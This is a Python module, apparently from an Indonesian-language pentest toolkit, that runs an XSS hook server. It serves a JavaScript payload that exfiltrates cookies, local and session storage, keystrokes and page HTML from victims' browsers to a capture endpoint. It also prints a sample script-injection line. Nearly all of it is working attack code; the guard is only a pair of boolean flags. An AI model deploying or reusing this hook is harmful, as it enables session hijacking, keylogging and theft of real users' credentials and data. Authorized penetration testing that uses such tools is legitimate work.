"""XSS hook / C2 capture: buktikan dampak XSS dengan callback.

Server HTTP lokal yang menyajikan:
- /hook.js  : payload hook yang mengirim cookie, keylog, dan DOM snapshot
- /capture  : endpoint yang menampung data dari korban (browser target)

Ketika payload hook disuntikkan ke XSS yang terkonfirmasi, korban (tester
yang membuka payload, atau admin yang kita uji) mengirim data ke server.
Ini MENGONFIRMASI dampak XSS nyata (bukan sekadar refleksi).

Semua data tersimpan lokal; GUARD: memerlukan `authorized=True` + `yes=True`
(server berjalan terus).
"""

import json
import os
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Optional
from urllib.parse import urlparse

from keris.core.logger import debug, info, ok, warn

HOOK_JS = r"""
(function(){
  function send(data){
    try{
      var url='/capture?d='+encodeURIComponent(btoa(JSON.stringify(data)));
      if(navigator.sendBeacon){navigator.sendBeacon(url);}else{
        new Image().src=url;
      }
    }catch(e){}
  }
  var payload={url:location.href, cookie:document.cookie, title:document.title};
  try{payload.localStorage=JSON.stringify(localStorage);}catch(e){}
  try{payload.sessionStorage=JSON.stringify(sessionStorage);}catch(e){}
  send(payload);
  // keylogger
  document.addEventListener('keydown',function(e){
    if(e.key.length===1){send({type:'key',k:e.key});}
  });
  // snapshot DOM setelah 3 detik
  setTimeout(function(){
    try{send({type:'dom',html:document.documentElement.outerHTML.slice(0,5000)});}catch(e){}
  },3000);
})();
"""


class _HookHandler(BaseHTTPRequestHandler):
    capture = {}
    lock = threading.Lock()

    def log_message(self, *a):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/hook.js":
            body = HOOK_JS.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/capture":
            from urllib.parse import parse_qs, unquote
            import base64
            d = parse_qs(parsed.query).get("d", [""])[0]
            try:
                decoded = json.loads(base64.b64decode(unquote(d)).decode("utf-8", "replace"))
            except Exception:
                decoded = {"raw": d[:1000]}
            with self.lock:
                self.capture.setdefault("events", []).append(decoded)
                self.capture["count"] = len(self.capture["events"])
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"ok")
            return
        self.send_response(404)
        self.end_headers()

    do_POST = do_GET


class XssHookServer:
    """Server capture XSS lokal."""

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self.host = host
        self.server = HTTPServer((host, port), _HookHandler)
        self.port = self.server.server_address[1]
        _HookHandler.capture = {}
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()
        return self

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

    @property
    def data(self) -> Dict:
        return dict(_HookHandler.capture)

    @property
    def count(self) -> int:
        return _HookHandler.capture.get("count", 0)

    def hook_url(self, base_ip: str) -> str:
        return f"http://{base_ip}:{self.port}/hook.js"


def start_hook(host: str = "127.0.0.1", port: int = 0,
               authorized: bool = False, yes: bool = False) -> Optional[XssHookServer]:
    """Mulai XSS hook server. Butuh --authorized + --yes."""
    if not authorized or not yes:
        warn("XSS hook memerlukan --authorized DAN --yes.")
        return None
    try:
        srv = XssHookServer(host, port)
        srv.start()
    except OSError as e:
        warn(f"Tidak dapat bind {host}:{port}: {e}")
        return None
    ok(f"XSS hook server aktif di http://{host}:{srv.port}")
    info(f"  hook.js: http://{host}:{srv.port}/hook.js")
    info("  Contoh payload XSS: <script src='http://LHOST:PORT/hook.js'></script>")
    info("  Data dari korban muncul di sini (cookie/keylog/DOM).")
    return srv
